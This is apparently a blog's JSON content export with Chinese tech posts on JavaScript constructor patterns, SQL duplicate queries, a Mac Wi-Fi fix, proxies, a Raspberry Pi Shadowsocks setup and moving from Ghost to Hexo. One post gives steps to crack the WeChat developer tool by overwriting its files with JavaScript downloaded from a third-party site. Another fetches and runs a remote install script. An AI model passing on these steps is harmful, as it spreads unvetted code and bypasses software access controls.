Person(\"bu\",25,\"software\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，Person()函数取代了createPerson()函数，我们注意到Person()与createPerson()的不同之处在于：没有显式的创建对象直接将属性和方法赋值给this对象没有return语句&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该注意到函数名Person使用的是大写字母P。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个Person实例，必须使用new操作符。以上这种方式会经过以下四个步骤：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，person1和person2分别保存着Person的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：console.log(person1.constructor == Person); &nbsp; &nbsp; //trueconsole.log(person2.constructor == Person); &nbsp; &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的constructor属性最初是用来标识对象类型的。但是，提到检测对象类型，还是instanceof操作符比较可靠一些。我们在这个例子中创建的对象都是Object对象的实例，也是Person对象的实例，这一点通过instanceof操作符可以验证。console.log(person1 instanceof Object); &nbsp; &nbsp; //trueconsole.log(person1 instanceof Person); &nbsp; &nbsp; //trueconsole.log(person2 instanceof Object); &nbsp; &nbsp; //trueconsole.log(person2 instanceof Person); &nbsp; &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，person1和person2之所以同是Object的实例，是因为所有的对象都继承自Object。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，person1和person2都有一个名为sayName()的方法，但是两个方法不是同一Function的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：function Person(name, age, job)&#123;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.job = job; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.sayName = new Function(\"alert(this.name);\") &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个Person实例都会包含一个不同的Function实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建Function新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。alert(person1.sayName == person2.sayName); &nbsp;//false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的Function实例的确没有必要；况且有this对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。function Person(name, age, job)&#123;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.job = job; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.sayName = sayName;&#125;function sayName()&#123; &nbsp; &nbsp;alert(this.name);\n&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。三、原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个prototype（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：function Person()&#123;&#125;Person.prototype.name = \"wei\";Person.prototype.age = 27;Person.prototype.job = \"Software\";Person.prototype.sayName = function()&#123;\n &nbsp; &nbsp; &nbsp;alert(this.name);&#125; var person1 = new Person();person1.sayName(); &nbsp; &nbsp; &nbsp;//\"wei\"var person2 = new Person();person2.sayName(); &nbsp; &nbsp; &nbsp;//\"wei\"alert(person1.sayName == person2.sayName);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在此，我们将sayName()方法和所有的属性直接添加在了Person的prototype属性中，构造函数变成了空函数。即便如此，我们仍然可以通过构造函数来创建新对象，而且新对象还会具有相同的属性和方法。但是与构造函数不同的是，新对象的这些属性和方法是由所有实例共享的。换句话说，person1和person2访问的都是同一组属性和同一个sayName()函数。要理解原型模式的工作原理，就必须先理解ECMAScript中原型对象的性质。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型对象的本性由于篇幅太长将会在下一章节详细分析。上面我们说了原型模式的好处，接下来我们来看一下原型模式的缺点。原型模式省略了为构造函数传递参数的这一环节，结果所有实例在默认情况下都具有相同的属性值。这会在某些程度上带来一种不便，这并不是原型模式最大的问题，因为如果我们想为一个通过原型模式创建的对象添加属性时，添加的这个属性就会屏蔽原型对象的保存的同名属性。换句话说，就是添加的这个属性会阻止我们去访问原型中的属性，但并不会改变原型中的属性。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原型模式最大的问题是由其共享的本质所导致的。原型中所有的属性被很多实例共享，这种共享对函数非常合适，对包含基本值的属性也说的过去，但是对引用类型的属性值来说问题就比较突出了，下面我们来看一个例子：function Person()&#123;\n&#125;\nPerson.prototype = &#123; &nbsp; &nbsp; &nbsp; &nbsp;constructor:Person, &nbsp; &nbsp; &nbsp; &nbsp;name:\"wei\", &nbsp; &nbsp; &nbsp; &nbsp;age:29, &nbsp; &nbsp; &nbsp; &nbsp;friends:[\"乾隆\",\"康熙\"], &nbsp; &nbsp; &nbsp; &nbsp;sayName:function()&#123;\n &nbsp; &nbsp; &nbsp; &nbsp;alert(this.name);\n &nbsp; &nbsp;&#125;\n&#125;var person1 = new Person();var person2 = new Person();\nperson1.friends.push(\"嬴政\");console.log(person1.friends); &nbsp; //[\"乾隆\",\"康熙\",\"嬴政\"]console.log(person2.friends); &nbsp; //[\"乾隆\",\"康熙\",\"嬴政\"]console.log(person1.friends === person2.friends); &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，Person.prototype对象有一个名为friends的属性，该属性包含一个字符串数组。然后创建了两个Person的实例，接着修改person1.friends引用的数组，向数组中添加一个字符串，由于数组存在于Person.prototype中而不是person1中，所以person2.friends也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。四、组合使用构造函数模式和原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：function Person(name, age)&#123; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.friends = [\"乾隆\",\"康熙\"];&#125;Person.prototype = &#123; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;constructor:Person, &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sayName:function()&#123; &nbsp; &nbsp; &nbsp; &nbsp;alert(this.name);\n &nbsp; &nbsp;&#125;&#125;var person1 = new Person(\"wei\",29);var person2 = new Person(\"bu\",25);person1.friends.push(\"嬴政\");console.log(person1.friends); &nbsp; //[\"乾隆\", \"康熙\", \"嬴政\"]console.log(person2.friends); &nbsp; //[\"乾隆\", \"康熙\"]console.log(person1.friends === person2.friends); &nbsp; //falseconsole.log(person1.sayName === person2.sayName); &nbsp; //true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性constructor和方法sayName()则是在原型中定义的。所以修改了person1.friends并不会改变person2.friends，因为他们分别引用了不同的数组。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。五、动态原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：function Person(name, age)&#123;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.friends = [\"乾隆\",\"康熙\"]; &nbsp; &nbsp;//注意if语句&nbsp;&nbsp;&nbsp;&nbsp;if(typeof this.sayName!=\"function\")&#123;&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = function()&#123; &nbsp;&nbsp;&nbsp;&nbsp;alert(this.name);\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#125;&#125;var person1 = new Person(\"wei\",29);person1.friends.push(\"嬴政\");\nperson1.sayName();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在sayName()方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用instanceof操作符来确定他的类型。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。六、寄生构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：function Person(name, age, job)&#123;&nbsp; var o = new Object();&nbsp; o.name = name;&nbsp; o.age = age;\n &nbsp; &nbsp;&nbsp; o.job = job;\n &nbsp; &nbsp;&nbsp; o.sayName = function()&#123;&nbsp; alert(this.name);\n &nbsp; &nbsp;&#125; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return o;\n&#125;var person = new Person(\"wei\",29,\"banzhuan\");\nperson.sayName(); &nbsp; //\"wei\"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，Person函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用new操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个return语句，可以重写调用构造函数时返回的值。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：function SpecialArray()&#123; &nbsp; &nbsp;//创建数组 &nbsp; &nbsp;var values = new Array(); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加值 &nbsp; &nbsp;values.push.apply(values,arguments); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加方法 &nbsp; &nbsp;values.toPipedString = function()&#123;\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;return this.join(\"|\");&#125; &nbsp; &nbsp;  &nbsp; &nbsp;//返回数组 &nbsp; &nbsp;return values; &#125;var colors = new SpecialArray(\"red\",\"blue\",\"green\");console.log(colors.toPipedString());//red|blue|green&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为SpecialArray的构造函数。在这个函数的内部，首先创建了一个数组，然后push()方法初始化了数组的值。随后又给数组实例添加了toPipedString()方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了SpecialArray构造函数，传入了初始化的值，并调用了toPipedString()方法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。七、稳妥构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓稳妥对象，是指没有公共属性，而且其方法也不引用this对象。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的Person构造函数重写如下：function Person(name, age, job)&#123; &nbsp; &nbsp; &nbsp; &nbsp;//创建要返回的新对象&nbsp; &nbsp; &nbsp; &nbsp;var o = new Object();  &nbsp; &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加方法&nbsp; &nbsp;o.sayName = function()&#123;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;alert(this.name);\n &nbsp; &nbsp;&nbsp; &nbsp;&#125;; &nbsp; &nbsp; &nbsp; &nbsp;//返回对象&nbsp; &nbsp;return o; &nbsp; &nbsp;&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用sayName()方法之外，没有其他办法访问name的值。可以像下面使用稳妥的Person构造函数：var person =Person(\"weiqi\",22,\"banzhuan\");person.sayName(); &nbsp; //weiqi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量person中保存的是一个稳妥对象，而除了sayName()方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。\n \n>转自：http://blog.csdn.net/u014346301/article/details/52204967","categories":["Web"],"tags":["Web"]},{"title":"Mac Wi-Fi掉线解决方案","url":"http://www.yfgeek.com/2016/10/09/Mac-Wi-Fi-掉线解决方案-1/","content":"最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。\n分享解决方案：\n进入目录/Library/Preferences/SystemConfiguration \n删除\ncom.apple.airport.preferences.plistcom.apple.network.identification.plistcom.apple.wifi.message-tracer.plistNetworkInterfaces.plistpreferences.plist\n\n重启\n解决问题。\n转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html\n","categories":["Mac"],"tags":["Mac"]},{"title":"SQL重复记录查询（转载）","url":"http://www.yfgeek.com/2016/10/05/SQL重复记录查询（转载）/","content":"&nbsp;1、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断\nselect&nbsp;*&nbsp;from&nbsp;people\nwhere&nbsp;peopleId&nbsp;in&nbsp;(select&nbsp;&nbsp;peopleId&nbsp;&nbsp;from&nbsp;&nbsp;people&nbsp;&nbsp;group&nbsp;&nbsp;by&nbsp;&nbsp;peopleId&nbsp;&nbsp;having&nbsp;&nbsp;count(peopleId)&nbsp;&gt;&nbsp;1)\n&nbsp;例二：\n&nbsp;select * from testtable\n&nbsp;where numeber in (select number from people group by number having count(number) &gt; 1 )\n&nbsp;可以查出testtable表中number相同的记录\n\n2、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录\ndelete&nbsp;from&nbsp;people&nbsp;\nwhere&nbsp;peopleId&nbsp;&nbsp;in&nbsp;(select&nbsp;&nbsp;peopleId&nbsp;&nbsp;from&nbsp;people&nbsp;&nbsp;group&nbsp;&nbsp;by&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;having&nbsp;&nbsp;count(peopleId)&nbsp;&gt;&nbsp;1)\nand&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;&nbsp;people&nbsp;&nbsp;group&nbsp;by&nbsp;peopleId&nbsp;&nbsp;having&nbsp;count(peopleId&nbsp;)&gt;1)\n\n3、查找表中多余的重复记录（多个字段）&nbsp;\nselect&nbsp;*&nbsp;from&nbsp;vitae&nbsp;a\nwhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;&nbsp;having&nbsp;count(*)&nbsp;&gt;&nbsp;1)\n\n4、删除表中多余的重复记录（多个字段），只留有rowid最小的记录\ndelete&nbsp;from&nbsp;vitae&nbsp;a\nwhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count(*)&nbsp;&gt;&nbsp;1)\nand&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count(*)&gt;1)\n\n\n5、查找表中多余的重复记录（多个字段），不包含rowid最小的记录\nselect&nbsp;*&nbsp;from&nbsp;vitae&nbsp;a\nwhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count(*)&nbsp;&gt;&nbsp;1)\nand&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count(*)&gt;1)\n\n(二)\n比方说\n在A表中存在一个字段“name”，\n而且不同记录之间的“name”值有可能会相同，\n现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；\nSelect&nbsp;Name,Count(*)&nbsp;From&nbsp;A&nbsp;Group&nbsp;By&nbsp;Name&nbsp;Having&nbsp;Count(*)&nbsp;&gt;&nbsp;1\n\n如果还查性别也相同大则如下:\nSelect&nbsp;Name,sex,Count(*)&nbsp;From&nbsp;A&nbsp;Group&nbsp;By&nbsp;Name,sex&nbsp;Having&nbsp;Count(*)&nbsp;&gt;&nbsp;1\n\n\n(三)\n方法一\n\ndeclare&nbsp;@max&nbsp;integer,@id&nbsp;integer\n\ndeclare&nbsp;cur_rows&nbsp;cursor&nbsp;local&nbsp;for&nbsp;select&nbsp;主字段,count(*)&nbsp;from&nbsp;表名&nbsp;group&nbsp;by&nbsp;主字段&nbsp;having&nbsp;count(*)&nbsp;&gt;；&nbsp;1\n\nopen&nbsp;cur_rows\n\nfetch&nbsp;cur_rows&nbsp;into&nbsp;@id,@max\n\nwhile&nbsp;@@fetch_status=0\n\nbegin\n\nselect&nbsp;@max&nbsp;=&nbsp;@max&nbsp;-1\n\nset&nbsp;rowcount&nbsp;@max\n\ndelete&nbsp;from&nbsp;表名&nbsp;where&nbsp;主字段&nbsp;=&nbsp;@id\n\nfetch&nbsp;cur_rows&nbsp;into&nbsp;@id,@max\n\nend\n\nclose&nbsp;cur_rows\n\nset&nbsp;rowcount&nbsp;0\n\n方法二\n\n　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。\n\n1、对于第一种重复，比较容易解决，使用\n\nselect&nbsp;distinct&nbsp;*&nbsp;from&nbsp;tableName\n\n就可以得到无重复记录的结果集。\n\n如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除\n\nselect&nbsp;distinct&nbsp;*&nbsp;into&nbsp;#Tmp&nbsp;from&nbsp;tableName\n\ndrop&nbsp;table&nbsp;tableName\n\nselect&nbsp;*&nbsp;into&nbsp;tableName&nbsp;from&nbsp;#Tmp\n\ndrop&nbsp;table&nbsp;#Tmp\n\n发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。\n\n2、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下\n\n假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集\n\nselect&nbsp;identity(int,1,1)&nbsp;as&nbsp;autoID,&nbsp;*&nbsp;into&nbsp;#Tmp&nbsp;from&nbsp;tableName\n\nselect&nbsp;min(autoID)&nbsp;as&nbsp;autoID&nbsp;into&nbsp;#Tmp2&nbsp;from&nbsp;#Tmp&nbsp;group&nbsp;by&nbsp;Name,autoID\n\nselect&nbsp;*&nbsp;from&nbsp;#Tmp&nbsp;where&nbsp;autoID&nbsp;in(select&nbsp;autoID&nbsp;from&nbsp;#tmp2)\n\n最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）\n\n(四)\n\n查询重复\n\nselect&nbsp;*&nbsp;from&nbsp;tablename&nbsp;where&nbsp;id&nbsp;in&nbsp;(\n\nselect&nbsp;id&nbsp;from&nbsp;tablename&nbsp;\n\ngroup&nbsp;by&nbsp;id&nbsp;\n\nhaving&nbsp;count(id)&nbsp;&gt;&nbsp;1\n\n)\n","categories":["Sql"],"tags":["Sql"]},{"title":"使用ProxyChains进行终端代理","url":"http://www.yfgeek.com/2016/09/26/使用ProxyChains进行终端代理/","content":"安装brew install proxychains-ng\n配置vi /usr/local/etc/proxychains.conf\n使用proxychains4 ssh xx:xx@xx.com","categories":["Hack"],"tags":["Hack"]},{"title":"微信小程序的一些感想","url":"http://www.yfgeek.com/2016/09/25/微信小程序的一些感想/","content":"前言这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。\n \n下载微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。Mac版下载地址：http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg\nwindows下载地址：http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe\n破解如果你不是内测用户，你需要破解，先下载以下文件。\n文件1：\nhttp://source.lattecake.com/files/2016/09/createstep.js\n文件2：\nhttp://source.lattecake.com/files/2016/09/projectStores.js\n替换路径：\ncreatestep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js\nprojectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js\n尝鲜\n做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的：\n\napp.js\napp.wxss\napp.json\napp.wxml\n\n其中wxss文件类似于css，所有css语法均支持js是APP()json文件是层级设置，页面的形态wxml文件更像是xml和html的混合版\n\nIDE并不强大，但是是用HTML写的，有点类似于VS CODE。\n优点\nHTML5是未来，腾讯帮助整个生态系统往前走了一大步。\n腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。\n有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。\n开发简单，入门门槛低。\n\n缺点\n不支持引用js，比如jquery等众多优秀的js插件。\n可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。\n随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。\n没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。\n\n总结我想用一句名言总结一下前端趋势及未来App趋势：\n\nAny application that can be written in JavaScript, will eventually be written in JavaScript.\n\n腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。\n不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。\n","categories":["Web"],"tags":["Web"]},{"title":"树莓派搭建ss服务器","url":"http://www.yfgeek.com/2016/09/13/树莓派搭建ss服务器/","content":"简介树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n为什么不用pptp vpn这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n一键配置脚本wget http://mirrors.linuxeye.com/oneinstack.tar.gztar xzf oneinstack.tar.gzcd oneinstack./shadowsocks.sh install\n漫长的等待结束就好了\n慢慢配置安装Pipapt-get install python-pip python-gevent python-m2crypto\n\n安装Shadowsockspip install shadowsocks\n\n创建Shadowsocks配置文件配置文件 /etc/shadowsocks.json 内容如下：\n&#123;    &quot;server&quot;:&quot;0.0.0.0&quot;,    &quot;server_port&quot;:8388,    &quot;local_address&quot;: &quot;127.0.0.1&quot;,    &quot;local_port&quot;:1080,    &quot;password&quot;:&quot;密码&quot;,    &quot;timeout&quot;:300,    &quot;method&quot;:&quot;aes-256-cfb&quot;,    &quot;fast_open&quot;: false,    &quot;workers&quot;: 1&#125;\n启动服务nohup ssserver -c /etc/shadowsocks.json &amp;\n\n设定为自动启动的方法写入 nohup ssserver -c /etc/shadowsocks.json &amp; 到 /etc/rc.local 文件的 exit 之前。\n","categories":["Linux"],"tags":["Raspberry"]},{"title":"GHOST搬迁到HEXO(Github Pages)指南","url":"http://www.yfgeek.com/2016/09/12/GHOST搬迁到HEXO-Github-Pages-指南/","content":"前言想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。\n但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。\n前提在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：\n\n安装HEXO\n配置Github\n\n搬家第一步Ghost导出数据json：实验室-导出，下载好json\n第二步安装搬家工具\nnpm i hexo-migrator-ghost --save  \n第三步修改./scaffolds/post.md文件内容为：\ntitle: &#123;&#123; title &#125;&#125;  date: &#123;&#123; date &#125;&#125;  tags: &#123;&#123; tags &#125;&#125;  ---\n第四步将json文件放到根目录，并且执行：\nhexo migrate ghost source.json  hexo clean ; hexo d -g 